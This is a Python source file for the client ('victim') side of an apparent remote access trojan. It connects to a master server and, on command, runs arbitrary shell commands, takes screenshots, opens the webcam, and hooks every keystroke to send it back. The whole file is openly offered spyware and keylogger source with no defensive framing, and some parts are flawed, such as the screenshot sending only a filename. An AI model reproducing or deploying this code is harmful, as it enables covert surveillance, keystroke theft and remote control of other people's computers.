import socket
from  PIL import ImageGrab
import os
import cv2
from pynput import keyboard
import keyboard

#consts
MASTER_HOST = '127.0.0.1'
MASTER_PORT = 8080
BUFFER_SIZE = 4096
HASH = 'utf-8'

#take a screenshot and send it to the master
def take_screenshot(filename, socket):
    screenshot = ImageGrab.grab()
    screenshot.save(filename)
    screenshot.close()
    socket.send(filename.encode(HASH))

#run a command on the victim's cmd
def cmd_control(command):
    os.system(command)
    
#open a live webcam window    
def get_webcam():
    cv2.namedWindow("press ESC to exit")
    vc = cv2.VideoCapture(0)

    if vc.isOpened(): # try to get the first frame
        rval, frame = vc.read()
    else:
        rval = False

    while rval:
        cv2.imshow("press ESC to exit", frame)
        rval, frame = vc.read()
        key = cv2.waitKey(20)
        if key == 27: # exit on ESC
            break

    vc.release()
    cv2.destroyWindow("press ESC to exit")

def key_press_event(event,socket):
    socket.send(event.name.encode(HASH))

def main():
    #open a socket to connect the master (the server)
    with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as victim_socket:
        victim_socket.connect((MASTER_HOST, MASTER_PORT))
        
        #start a small conversation to aproove the connection (logs)
        print("master found!")
        if victim_socket.recv(BUFFER_SIZE).decode(HASH) == "connected?":
            print("MASTER: connected?")
            victim_socket.send("YES!".encode(HASH))
            print("VICTIM: YES!")
        else:
            victim_socket.send("NO".encode(HASH))
            print("VICTIM: NO")
            return
        
        #recive the command from the msater
        remote_command = victim_socket.recv(BUFFER_SIZE).decode(HASH)
        #take a screenshot, save it as a file and send it to the master
        if remote_command == "screenshot":
            take_screenshot("test.png", victim_socket)
            print("screenshot was taken...")
        #run the command that the master sent in the current cmd and sent a screenshot of the command results
        elif remote_command == "cmd":
            print("master using cmd...")
            victim_socket.send("victim's cmd is ready to get the command...".encode(HASH))
            cmd_control(victim_socket.recv(BUFFER_SIZE).decode(HASH))
            take_screenshot("cmd.png",victim_socket)
        #active the victim's webcam and take a screenshot before the webcam closed
        elif remote_command == "webcam":
            get_webcam()
            take_screenshot("webcam.png",victim_socket)
        #send to the master's console every key that is pressed
        elif remote_command == "keylis":
            # register the callback for all key events
            keyboard.hook(callback=lambda event: key_press_event(event,victim_socket))
            # keep the program running
            keyboard.wait('esc')
            
if __name__ == '__main__':
    main()